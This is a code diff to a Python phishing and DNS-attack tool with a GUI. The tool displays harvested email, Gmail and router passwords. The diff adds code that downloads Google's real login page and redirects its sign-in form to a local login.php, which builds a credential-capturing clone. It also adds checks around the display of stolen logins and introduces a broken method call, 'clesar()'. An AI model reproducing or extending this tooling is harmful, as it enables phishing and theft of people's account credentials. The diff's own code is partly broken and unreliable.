@@ -212,7 +212,8 @@ class frm_dnsAttack(QWidget):
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
                 s = j.split("-")
-                self.box_login.append("Email: " +s[0] + "   Password: " +s[1])
+                if s != None:
+                    self.box_login.append("Email: " +s[0] + "   Password: " +s[1])
 
         elif self.rb_gmail.isChecked():
             self.box_login.clear()
@@ -223,10 +224,11 @@ class frm_dnsAttack(QWidget):
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
                 s = j.split("-")
-                self.box_login.append("Email: " +s[0] + "   Password: " +s[1])
+                if s != None:
+                    self.box_login.append("Email: " +s[0] + "   Password: " +s[1])
 
         elif self.rb_route.isChecked():
-            self.box_login.clear()
+            self.box_login.clesar()
             logins = []
             chdir(self.owd)
             self.box_login.append("=================== Router Logins =====================")
@@ -234,7 +236,8 @@ class frm_dnsAttack(QWidget):
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
                 s = j.split("-")
-                self.box_login.append("IP: " +s[0] + "   Password: " +s[1])
+                if s != None:
+                    self.box_login.append("IP: " +s[0] + "   Password: " +s[1])
 
     def kill_attack(self):
         if self.control != None:
@@ -259,18 +262,22 @@ class frm_dnsAttack(QWidget):
                 if not getuid() == 0:
                     QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                     return None
+
                 self.t = threading.Thread(target=self.phishing_page,args=(sock,))
                 self.t.daemon = True
                 self.t.start()
 
         elif self.rb_gmail.isChecked():
             sock = None
-            if not getuid() == 0:
-                    QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
-                    return None
-            self.t = threading.Thread(target=self.phishing_page,args=(sock,))
-            self.t.daemon = True
-            self.t.start()
+            try:
+                request = urlopen('http://accounts.google.com/Login?hl').read()
+                self.control = 1
+            except URLError,e:
+                QMessageBox.information(self,"Error","Server not found, can't find the server at google. " + str(e))
+            if self.control != None:
+                self.t = threading.Thread(target=self.phishing_page,args=(sock,))
+                self.t.daemon = True
+                self.t.start()
 
         elif self.rb_route.isChecked():
             sock = 1
@@ -388,6 +395,12 @@ class frm_dnsAttack(QWidget):
             path = "Module/Phishing/Gmail/"
             try:
                 chdir(path)
+                request = urlopen('http://accounts.google.com/Login?hl').read()
+                request = request.replace("//ssl.gstatic.com/accounts/ui/","")
+                request = request.replace("https://accounts.google.com/ServiceLoginAuth","login.php")
+                google_page = open("index.html", "w")
+                google_page.write(request)
+                google_page.close()
             except OSError,e:
                 return None
             type_phishing = "Gmail"
